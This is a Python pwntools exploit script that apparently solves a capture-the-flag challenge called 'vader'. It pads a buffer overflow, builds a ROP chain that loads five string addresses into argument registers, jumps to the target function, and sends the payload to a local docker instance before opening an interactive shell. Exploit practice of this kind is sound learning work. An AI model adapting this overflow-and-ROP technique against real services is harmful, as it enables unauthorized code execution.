#!/usr/bin/env python3

from pwn import *

print("Hello")

e = ELF('vader')

vaderAddr = e.symbols['vader']
print("vader function @ {}".format(hex(vaderAddr)))

r = ROP(e)
print(r.r8)
print(r.rdi)
print(r.rsi)
print(r.rdx)
print(r.rcx)

payload = b""
charToAdd = 0x61 # lower A
for i in range(0,10):
    charsToAdd = chr(charToAdd) * 4
    print("charsToAdd = {}".format(charsToAdd))

    bytesToAdd = charsToAdd.encode("utf-8")
    payload += bytesToAdd
    charToAdd += 1

string_dark_address  = 0x00402ec9
string_side_address  = 0x402ece
string_of_address    = 0x402ed3
string_the_address   = 0x402ed6
string_force_address = 0x402eda

d_addr = e.search(b'DARK')
print("d_addr = {}".format(d_addr))

for each_addr in d_addr:
    print("    Here: {}".format(hex(each_addr)))

# Must do this or it makes a 32-bit rop
context.clear(arch='amd64')

r(rdi=string_dark_address,
  rsi=string_side_address,
  rdx=string_of_address,
  rcx=string_the_address,
  r8=string_force_address)

print("ROP:")
print(r.dump())


#sys.exit()
rop_chain = r.chain()
print(rop_chain.hex())

payload += r.chain()

payload += p64(vaderAddr)
payload += b"\n"

print("Payload: {}".format(payload))

#sh = process('./vader')

# Running against my own docker instance running the challenge
sh = remote("127.0.0.1",1337)

#sh = gdb.debug('./vader', '''
#        b *0x4015f3
#        continue
#        ''')

sh.recvuntil(b'>>>', drop=True)

sh.send(payload)
sh.interactive()


